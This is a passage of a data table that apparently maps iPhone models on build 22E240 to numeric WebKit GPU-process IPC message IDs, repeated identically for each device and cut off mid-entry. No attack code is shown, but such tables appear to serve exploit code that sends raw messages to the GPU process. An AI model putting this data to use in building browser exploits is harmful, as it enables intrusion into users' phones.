      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone14,7_22E240": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone14,8_22E240": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone15,2_22E240": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone15,3_22E240": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone15,4_22E240": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone15,5_22E240": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone16,1_22E240": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone16,2_22E240": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone17,1_22E240": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone17,2_22E240": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone17,3_22E240": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone17,4_22E240": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
